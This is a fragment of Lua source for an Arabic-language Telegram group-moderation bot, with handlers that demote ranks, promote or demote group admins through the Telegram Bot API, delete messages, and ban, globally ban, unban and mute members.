--     Source DevProx     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_)
delvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_,result.id_)
delvipmem(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_,user)
delvipmem(msg,msg.chat_id_,user)
end end 
--     Source DevProx     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then 
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if is_leaderid(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱتستطيع تنزيڵ ٱڵمطور ٱلٱسٱسي", 1, 'md')
return false 
end end
if DevAbs:sismember(DevProx..'abs:sudo3:',result.sender_user_id_) then
sudo3 = 'ٱڵمطورين • ' else sudo3 = '' end
if DevAbs:sismember(DevProx..'abs:ownerall:',result.sender_user_id_) then
ownerall = 'ٱڵمدرٱء ٱڵعٱمين • ' else ownerall = '' end
if DevAbs:sismember(DevProx..'abs:adminall:',result.sender_user_id_) then
adminall = 'ٱلٱدمنية ٱڵعٱمين • ' else adminall = '' end
if DevAbs:sismember(DevProx..'abs:vipall:',result.sender_user_id_) then
vpall = 'ٱڵمميزين ٱڵعٱمين • ' else vpall = '' end
if DevAbs:sismember(DevProx..'abs:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'ٱڵمنشئين ٱلٱسٱسيين • ' else monsh = '' end
if DevAbs:sismember(DevProx..'abs:monshid:'..msg.chat_id_, result.sender_user_id_) then
monshid = 'ٱڵمنشئين • ' else monshid = '' end 
if DevAbs:sismember(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'ٱڵمدراء • ' else owner = '' end
if DevAbs:sismember(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'ٱلٱدمنية • ' else admins = '' end
if DevAbs:sismember(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'ٱڵمميزين • ' else vipmem = ''
end
if absmasco(result.sender_user_id_,msg.chat_id_) ~= false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵـمسخدم ↫ ❨ ["..absc9.."] ❩\n☬︙تـۖم تنزيڵه من ↫ ⤈\n⌯ ( "..sudo3..''..ownerall..''..adminall..''..vpall..''..monsh..''..monshid..''..owner..''..admins..''..vipmem.." ) ⌯ \n", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵـعضو ↫ ❨ ["..absc9.."] ❩ \n☬︙ڵم تتم ترقيته مسبقٱ", 1, 'md')
end
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevAbs:srem(DevProx..'abs:sudo3:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:ownerall:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:adminall:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipall:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
DevAbs:srem(DevProx..'abs:ownerall:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:adminall:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipall:', result.sender_user_id_)
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monshid' then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if is_leaderid(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱتستطيع تنزيڵ ٱڵمطور ٱلٱسٱسي", 1, 'md')
return false 
end end
if DevAbs:sismember(DevProx..'abs:sudo3:',result.id_) then
sudo3 = 'ٱڵمطورين • ' else sudo3 = '' end
if DevAbs:sismember(DevProx..'abs:ownerall:',result.id_) then
ownerall = 'ٱڵمدرٱء ٱڵعٱمين • ' else ownerall = '' end
if DevAbs:sismember(DevProx..'abs:adminall:',result.id_) then
adminall = 'ٱلٱدمنية ٱڵعٱمين • ' else adminall = '' end
if DevAbs:sismember(DevProx..'abs:vipall:',result.id_) then
vpall = 'ٱڵمميزين ٱڵعٱمين • ' else vpall = '' end
if DevAbs:sismember(DevProx..'abs:monsh:'..msg.chat_id_, result.id_) then
monsh = 'ٱڵمنشئين ٱلٱسٱسيين • ' else monsh = '' end
if DevAbs:sismember(DevProx..'abs:monshid:'..msg.chat_id_, result.id_) then
monshid = 'ٱڵمنشئين • ' else monshid = '' end 
if DevAbs:sismember(DevProx..'abs:owners:'..msg.chat_id_, result.id_) then
owner = 'ٱڵمدرٱء • ' else owner = '' end
if DevAbs:sismember(DevProx..'abs:admins:'..msg.chat_id_, result.id_) then
admins = 'ٱلٱدمنية • ' else admins = '' end
if DevAbs:sismember(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_) then
vipmem = 'ٱڵمميزين • ' else vipmem = ''
end
if absmasco(result.id_,msg.chat_id_) ~= false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵـمسخدم ↫ ❨ ["..absc9.."] ❩\n☬︙تـۖم تنزيڵه من ↫ ⤈\n⌯ ( "..sudo3..''..ownerall..''..adminall..''..vpall..''..monsh..''..monshid..''..owner..''..admins..''..vipmem.." ) ⌯ \n ", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵـعضو ↫ ❨ ["..absc9.."] ❩ \n☬︙ڵم تتم ترقيته مسبقٱ", 1, 'md')
end 
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevAbs:srem(DevProx..'abs:sudo3:', result.id_)
DevAbs:srem(DevProx..'abs:ownerall:', result.id_)
DevAbs:srem(DevProx..'abs:adminall:', result.id_)
DevAbs:srem(DevProx..'abs:vipall:', result.id_)
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,result.id_)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
DevAbs:srem(DevProx..'abs:ownerall:', result.id_)
DevAbs:srem(DevProx..'abs:adminall:', result.id_)
DevAbs:srem(DevProx..'abs:vipall:', result.id_)
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monshid' then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source DevProx     --
if text:match("^رفع ادمن بالكروب$") and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) or text:match("^رفع ادمن الكروب$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه ٱدمن فيۧ ٱڵكروب', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$") and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) or text:match("^تنزيل ادمن الكروب$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱدمن ٱڵكروب ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه ٱدمن من ٱڵكروب', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$") and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) or text:match("^رفع بكل صلاحيات$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه ٱدمن فيۧ جميع ٱڵصلٱحيٱت', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$") and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_  and Abbas_Abs(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء خٱصية تغيير ٱلٱسـم عنه', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$") and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and Abbas_Abs(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء خٱصية ٱڵـتثبيت عنه', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^مسح$") or text:match("^حذف$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حـذف ٱڵرسٱڵة مع رسٱڵة ٱلٱمـر ', 1, 'md')
end
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") and Abbas_Abs(msg) or text:match("^تفعيل الطرد$") and Abbas_Abs(msg) then
DevAbs:del("ABS_PROX:lock:ban"..bot_id..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱڵـطرد وٱڵـحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الحظر$") and Abbas_Abs(msg) or text:match("^تعطيل الطرد$") and Abbas_Abs(msg) then
DevAbs:set("ABS_PROX:lock:ban"..bot_id..msg.chat_id_,"ABS_PROX")
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱڵـطرد وٱڵـحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
--     Source DevProx     --
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n☬︙لٱنة معطل من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
function ban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:banned:'..msg.chat_id_
if not is_admin(result.sender_user_id_, result.chat_id_) then
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ بٱڵفعڵ محظور في ٱڵـمجموعة', 1, 'md')
chat_kick(result.chat_id_, result.sender_user_id_)
else
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم حظرة من ٱڵـمجموعة', 1, 'md')
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
--     Source DevProx     --
if text:match('^حظر @(.*)$') and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local ap = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
local abs = 'bot:banned:'..msg.chat_id_
if result.id_ then 
if is_admin(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع حظر ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(DevProx..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ [@'..ap[2]..'] ❩\n☬︙هوَ بٱڵفعڵ محظور من ٱڵـمجموعة', 1, 'md')
else
DevAbs:sadd(DevProx..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ [@'..ap[2]..'] ❩\n☬︙تـۖم حظرة من ٱڵـمجموعة', 1, 'md')
chat_kick(msg.chat_id_, result.id_)
end
end
end
end
resolve_username(ap[2],ban_by_username)
end
--     Source DevProx     --
if text:match("^حظر (%d+)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(حظر) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n☬︙لٱنة معطل من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not is_admin(ap[2], msg.chat_id_) then
DevAbs:sadd(DevProx..'bot:banned:'..msg.chat_id_, ap[2])
chat_kick(msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ [@'..ap[2]..'] ❩\n☬︙تـۖم حظرة من ٱڵـمجموعة', 1, 'md')
end
end
end
--     Source DevProx     --
local text = msg.content_.text_:gsub('الغاء حظر','الغاء الحظر')
if text:match("^الغاء الحظر$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
function ABS_PROX(extra, result, success)
function unban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:banned:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ ڵيس محظور ڵيتم حظرة', 1, 'md')
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمحظور ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء حظرة من ٱڵـمجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,ABS_PROX)
end
--     Source DevProx     --
if text:match("^الغاء الحظر @(.*)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(الغاء الحظر) @(.*)$")}
function unban_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_, result.id_) then
text = '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ ڵيس محظور ڵيتم حظرة'
else
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_, result.id_)
text = '☬︙ٱڵـمحظور ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء حظرة من ٱڵـمجموعة'
end
else
text = '☬︙*ٱڵمعرف غير صحيح*'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(ap[2],unban_by_username)
end
--     Source DevProx     --
if text:match("^الغاء الحظر (%d+)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(الغاء الحظر) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_, ap[2]) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..ap[2]..'] ❩\n☬︙هوَ ڵيس محظور ڵيتم حظرة', 1, 'md')
else
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمحظور ↫ ❨ ['..ap[2]..'] ❩\n☬︙تـۖم ٱڵغٱء حظرة من ٱڵـمجموعة', 1, 'md')
end
end
end
--     Source DevProx     --
local text = msg.content_.text_:gsub('حضر عام','حظر عام')
if text:match("^حظر عام$") and is_sudo(msg) and msg.reply_to_message_id_ and Abbas_Abs(msg) then
function gban_by_reply(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵـعضو* ↫ ❨ ['..absc9..'] ❩\n☬︙*تـۖم حظرة من* ❨ *'..gps..'* ❩ *مجموعة* \n ✓', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
--     Source DevProx     --
if text:match("^حظر عام @(.*)$") and is_sudo(msg) then
local aps = {string.match(text, "^(حظر عام) @(.*)$")}
function gban_by_username(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
if result.id_ then
text = '☬︙*ٱڵـعضو* ↫ ❨ ['..absc9..'] ❩\n☬︙*تـۖم حظرة من* ❨ *'..gps..'* ❩ *مجموعة* \n ✓'
DevAbs:sadd(DevProx..abs, result.id_)
else
text = '☬︙*ٱڵمعرف غير صحيح*'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(aps[2],gban_by_username)
end
--     Source DevProx     --
if text:match("^حظر عام (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^(حظر عام) (%d+)$")}
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵـعضو* ↫ ❨ ['..absc9..'] ❩\n☬︙*تـۖم حظرة من* ❨ *'..gps..'* ❩ *مجموعة* \n ✓', 1, 'md')
end
DevAbs:set(DevProx..'bot:gban:'..ap[2],true)
DevAbs:sadd(DevProx..abs, ap[2])
end
--     Source DevProx     --
local text = msg.content_.text_:gsub('الغاء العام','الغاء عام')
if text:match("^الغاء عام$") and is_sudo(msg) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵـعضو* ↫ ❨ ['..absc9..'] ❩\n☬︙*تـۖم ٱڵغٱء حظرة من* ❨ *'..gps..'* ❩ *مجموعة* \n ✓', 1, 'md')
end
DevAbs:srem(DevProx..abs, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
--     Source DevProx     --
if text:match("^الغاء عام @(.*)$") and is_sudo(msg) then
local apid = {string.match(text, "^(الغاء عام) @(.*)$")}
function ungban_by_username(extra, result, success)
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
if result.id_ then
text = '☬︙*ٱڵـعضو* ↫ ❨ ['..absc9..'] ❩\n☬︙*تـۖم ٱڵغٱء حظرة من* ❨ *'..gps..'* ❩ *مجموعة* \n ✓'
end
DevAbs:srem(DevProx..abs, result.id_)
else
text = '☬︙*ٱڵمعرف غير صحيح*'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(apid[2],ungban_by_username)
end
--     Source DevProx     --
if text:match("^الغاء عام (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^(الغاء عام) (%d+)$")}
local gps = DevAbs:scard(DevProx.."bot:groups")
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
DevAbs:srem(DevProx..abs, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵـعضو* ↫ ❨ ['..absc9..'] ❩\n☬︙*تـۖم ٱڵغٱء حظرة من* ❨ *'..gps..'* ❩ *مجموعة* \n ✓', 1, 'md')
end
end
--     Source DevProx     --
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لٱ تستطيع كتمي*', 1, 'md')
return false 
end 
if is_admin(result.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع كتم ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
DevAbs:sadd(DevProx..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم كتمة من ٱڵـمجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     Source DevProx     --
if text:match('^كتم @(.*)$') and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local ap = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
local abs = 'bot:muted:'..msg.chat_id_
if result.id_ then 
if is_admin(result.id_, msg.chat_id_) then
